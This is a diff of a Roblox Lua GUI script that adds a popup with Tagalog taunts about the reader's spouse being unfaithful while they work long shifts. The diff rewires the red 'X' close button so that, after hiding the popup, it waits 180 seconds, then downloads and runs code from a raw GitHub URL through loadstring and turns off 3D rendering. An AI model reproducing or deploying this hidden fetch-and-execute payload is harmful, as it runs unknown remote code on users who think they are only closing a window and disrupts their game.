@@ -5,8 +5,10 @@
 
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
+local Frame_2 = Instance.new("Frame")
 local TextButton = Instance.new("TextButton")
-local TextBox = Instance.new("TextBox")
+local TitleRed = Instance.new("TextLabel")
+local TitleRed_2 = Instance.new("TextLabel")
 
 --Properties:
 
@@ -16,57 +18,71 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Frame.Parent = ScreenGui
 Frame.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
 Frame.BorderColor3 = Color3.fromRGB(72, 72, 72)
-Frame.NextSelectionLeft = TextBox
-Frame.Position = UDim2.new(0.165889665, 0, 0.42243287, 0)
-Frame.Size = UDim2.new(0, 809, 0, 341)
+Frame.Position = UDim2.new(0.243182108, 0, 0.186772078, 0)
+Frame.Size = UDim2.new(0, 495, 0, 303)
+
+Frame_2.Parent = Frame
+Frame_2.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+Frame_2.BorderColor3 = Color3.fromRGB(153, 153, 153)
+Frame_2.Position = UDim2.new(0.0110337995, 0, 0.0212582629, 0)
+Frame_2.Size = UDim2.new(0, 483, 0, 288)
 
 TextButton.Parent = Frame
 TextButton.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
 TextButton.BorderColor3 = Color3.fromRGB(27, 27, 27)
-TextButton.Position = UDim2.new(0.424374491, 0, 0.901370347, 0)
-TextButton.Size = UDim2.new(0, 105, 0, 88)
+TextButton.Position = UDim2.new(0.406294793, 0, 0.826055229, 0)
+TextButton.Size = UDim2.new(0, 91, 0, 91)
 TextButton.Font = Enum.Font.LuckiestGuy
 TextButton.Text = "X"
 TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
-TextButton.TextSize = 75.000
+TextButton.TextSize = 80.000
 TextButton.TextYAlignment = Enum.TextYAlignment.Bottom
 
-TextBox.Parent = Frame
-TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextBox.BackgroundTransparency = 1.000
-TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextBox.BorderSizePixel = 0
-TextBox.Position = UDim2.new(0.0186569151, 0, 0.0509307943, 0)
-TextBox.Size = UDim2.new(0, 781, 0, 314)
-TextBox.Font = Enum.Font.LuckiestGuy
-TextBox.Text = "Please check your kutson.\\n\\nBaka may pumapatong na sa asawa mo  nagtratrabaho ka.\\n\\nCheck mo muna bago iclose to."
-TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextBox.TextSize = 40.000
-TextBox.TextStrokeColor3 = Color3.fromRGB(38, 71, 255)
-TextBox.TextStrokeTransparency = 0.000
-TextBox.TextWrapped = true
+TitleRed.Name = "TitleRed"
+TitleRed.Parent = TextButton
+TitleRed.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+TitleRed.BorderColor3 = Color3.fromRGB(27, 27, 27)
+TitleRed.Position = UDim2.new(-2.04092646, 0, -2.48221993, 0)
+TitleRed.Size = UDim2.new(0, 463, 0, 109)
+TitleRed.Font = Enum.Font.GothamBold
+TitleRed.Text = "Check Kutson please, masmabilis magfarm pag magisa, mas mabilis ka ding matatapos."
+TitleRed.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleRed.TextSize = 25.000
+TitleRed.TextStrokeColor3 = Color3.fromRGB(37, 29, 255)
+TitleRed.TextStrokeTransparency = 0.000
+TitleRed.TextWrapped = true
+
+TitleRed_2.Name = "TitleRed"
+TitleRed_2.Parent = TextButton
+TitleRed_2.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+TitleRed_2.BorderColor3 = Color3.fromRGB(27, 27, 27)
+TitleRed_2.Position = UDim2.new(-1.87609112, 0, -1.19650531, 0)
+TitleRed_2.Size = UDim2.new(0, 433, 0, 85)
+TitleRed_2.Font = Enum.Font.GothamBold
+TitleRed_2.Text = "Check mo din ung kutson nyo sa bahay, baka may gumagamit na iba pag wala ka ng dose oras"
+TitleRed_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleRed_2.TextSize = 25.000
+TitleRed_2.TextStrokeColor3 = Color3.fromRGB(37, 29, 255)
+TitleRed_2.TextStrokeTransparency = 0.000
+TitleRed_2.TextWrapped = true
 
 -- Scripts:
 
-local function MOGWVMD_fake_script() -- Frame.Drag 
+local function TBODKS_fake_script() -- Frame.Drag 
 	local script = Instance.new('LocalScript', Frame)
 
 	script.Parent.Active = true
 	script.Parent.Draggable = true
 end
-coroutine.wrap(MOGWVMD_fake_script)()
-local function MIYACUG_fake_script() -- TextButton.quitbutton 
+coroutine.wrap(TBODKS_fake_script)()
+local function BWIMZ_fake_script() -- TextButton.quitbutton 
 	local script = Instance.new('Script', TextButton)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Visible = false
+		wait(180)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/GrayArea"))()
+		game:GetService("RunService"):Set3dRenderingEnabled(false)
 	end)
 end
-coroutine.wrap(MIYACUG_fake_script)()
-local function PPMPR_fake_script() -- TextBox.Drag 
-	local script = Instance.new('LocalScript', TextBox)
-
-	script.Parent.Active = true
-	script.Parent.Draggable = true
-end
-coroutine.wrap(PPMPR_fake_script)()
+coroutine.wrap(BWIMZ_fake_script)()
